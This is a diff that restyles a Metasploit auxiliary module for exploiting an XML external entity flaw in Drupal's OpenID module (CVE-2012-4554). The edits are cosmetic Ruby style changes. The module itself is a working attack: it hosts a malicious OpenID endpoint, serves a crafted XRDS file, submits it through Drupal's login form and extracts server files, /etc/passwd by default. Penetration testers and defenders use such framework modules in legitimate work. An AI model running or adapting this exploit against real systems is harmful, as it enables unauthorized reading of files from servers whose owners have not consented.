@@ -1,52 +1,49 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer::HTML
   include REXML
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Drupal OpenID External Entity Injection',
-      'Description'    => %q{
-        This module abuses an XML External Entity Injection
-        vulnerability on the OpenID module from Drupal. The vulnerability exists
-        in the parsing of a malformed XRDS file coming from a malicious OpenID
-        endpoint. This module has been tested successfully on Drupal 7.15 and
-        7.2 with the OpenID module enabled.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Reginaldo Silva', # Vulnerability discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '2012-4554' ],
-          [ 'OSVDB', '86429' ],
-          [ 'BID', '56103' ],
-          [ 'URL', 'https://drupal.org/node/1815912' ],
-          [ 'URL', 'http://drupalcode.org/project/drupal.git/commit/b912710' ],
-          [ 'URL', 'http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]
-        ],
-      'DisclosureDate' => 'Oct 17 2012'
-    ))
+                      'Name'           => 'Drupal OpenID External Entity Injection',
+                      'Description'    => %q(
+                        This module abuses an XML External Entity Injection
+                        vulnerability on the OpenID module from Drupal. The vulnerability exists
+                        in the parsing of a malformed XRDS file coming from a malicious OpenID
+                        endpoint. This module has been tested successfully on Drupal 7.15 and
+                        7.2 with the OpenID module enabled.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Reginaldo Silva', # Vulnerability discovery
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          [ 'CVE', '2012-4554' ],
+                          [ 'OSVDB', '86429' ],
+                          [ 'BID', '56103' ],
+                          [ 'URL', 'https://drupal.org/node/1815912' ],
+                          [ 'URL', 'http://drupalcode.org/project/drupal.git/commit/b912710' ],
+                          [ 'URL', 'http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]
+                        ],
+                      'DisclosureDate' => 'Oct 17 2012'))
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, "Base Drupal directory path", '/drupal']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   def xrds_file
@@ -61,19 +58,16 @@ class MetasploitModule < Msf::Auxiliary
 
     xml.add_element(
       "xrds:XRDS",
-      {
-        'xmlns:xrds'    => "xri://$xrds",
-        'xmlns'         => "xri://$xrd*($v*2.0)",
-        'xmlns:openid' => "http://openid.net/xmlns/1.0",
-      })
+      'xmlns:xrds' => "xri://$xrds",
+      'xmlns' => "xri://$xrd*($v*2.0)",
+      'xmlns:openid' => "http://openid.net/xmlns/1.0"
+    )
 
     xrd = xml.root.add_element("XRD")
 
     xrd.add_element(
       "Status",
-      {
-        "cid" => "verified"
-      }
+      "cid" => "verified"
     )
     provider = xrd.add_element("ProviderID")
     provider.text = "xri://@"
@@ -95,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
     local_id = service.add_element("LocalID")
     local_id.text = "http://example.com/xrds"
 
-    return xml.to_s.gsub(/METASPLOIT/, "#{get_uri}/#{@prefix}/&xxe;/#{@suffix}") # To avoid html encoding
+    xml.to_s.gsub(/METASPLOIT/, "#{get_uri}/#{@prefix}/&xxe;/#{@suffix}") # To avoid html encoding
   end
 
   def check
@@ -107,15 +101,11 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Unknown
     end
 
-    if drupal_with_openid?(res, signature)
-      return Exploit::CheckCode::Detected
-    end
+    return Exploit::CheckCode::Detected if drupal_with_openid?(res, signature)
 
-    if generated_with_drupal?(res)
-      return Exploit::CheckCode::Safe
-    end
+    return Exploit::CheckCode::Safe if generated_with_drupal?(res)
 
-    return Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown
   end
 
   def run
@@ -155,7 +145,6 @@ class MetasploitModule < Msf::Auxiliary
     service.stop
   end
 
-
   def on_request_uri(cli, request)
     if request.uri =~ /#{@prefix}/
       vprint_status("Signature found, parsing file...")
@@ -164,27 +153,25 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status("Sending XRDS...")
-    send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
+    send_response_html(cli, xrds_file, 'Content-Type' => 'application/xrds+xml')
   end
 
   def send_openid_auth(identifier)
-    res = send_request_cgi({
-      'uri'    => normalize_uri(target_uri.to_s, "/"),
-      'method' => 'POST',
-      'vars_get' => {
-        "q" => "node",
-        "destination" => "node"
-      },
-      'vars_post' => {
-        "openid_identifier" => identifier,
-        "name" => "",
-        "pass" => "",
-        "form_id" => "user_login_block",
-        "op" => "Log in"
-      }
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.to_s, "/"),
+                           'method' => 'POST',
+                           'vars_get' => {
+                             "q" => "node",
+                             "destination" => "node"
+                           },
+                           'vars_post' => {
+                             "openid_identifier" => identifier,
+                             "name" => "",
+                             "pass" => "",
+                             "form_id" => "user_login_block",
+                             "op" => "Log in"
+                           })
 
-    return res
+    res
   end
 
   def store(data)
@@ -196,38 +183,31 @@ class MetasploitModule < Msf::Auxiliary
     return nil if data.blank?
 
     # Full file found
-    if data =~ /#{@prefix}\/(.*)\/#{@suffix}/m
-      return $1
-    end
+    return Regexp.last_match(1) if data =~ /#{@prefix}\/(.*)\/#{@suffix}/m
 
     # Partial file found
-    if data =~ /#{@prefix}\/(.*)/m
-      return $1
-    end
+    return Regexp.last_match(1) if data =~ /#{@prefix}\/(.*)/m
 
-    return nil
+    nil
   end
 
   def loot?(data)
     return false if data.blank?
     store(data)
-    return true
+    true
   end
 
   def drupal_with_openid?(http_response, signature)
     return false if http_response.blank?
     return false unless http_response.code == 200
     return false unless http_response.body =~ /openid_identifier.*#{signature}/
-    return true
+    true
   end
 
   def generated_with_drupal?(http_response)
     return false if http_response.blank?
-    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
-    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
-    return false
+    return true if http_response.headers['X-Generator'] && http_response.headers['X-Generator'] =~ /Drupal/
+    return true if http_response.body && http_response.body.to_s =~ /meta.*Generator.*Drupal/
+    false
   end
-
-
 end
-
